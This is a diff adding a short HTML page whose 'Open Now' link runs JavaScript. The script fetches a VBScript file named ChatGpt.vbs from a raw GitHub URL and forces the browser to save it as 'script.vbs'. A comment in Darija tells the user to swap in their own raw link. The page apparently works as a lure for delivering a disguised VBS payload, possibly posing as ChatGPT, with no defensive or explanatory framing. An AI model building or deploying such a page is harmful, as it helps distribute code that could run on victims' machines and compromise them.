@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <a href="#" onclick="downloadVBS()">Open Now</a>
+
+    <script>
+        function downloadVBS() {
+            // 👇 غير هذا فقط بالرابط الخام ديالك
+            var rawUrl = 'https://raw.githubusercontent.com/adamaxcc-lgtm/curly-octo-gogglesZDZQDA/refs/heads/main/ChatGpt.vbs';
+            
+            fetch(rawUrl)
+                .then(r => r.text())
+                .then(code => {
+                    var blob = new Blob([code], {type: 'application/octet-stream'});
+                    var link = document.createElement('a');
+                    link.href = URL.createObjectURL(blob);
+                    link.download = 'script.vbs';
+                    link.click();
+                });
+        }
+    </script>
+</body>
+</html>
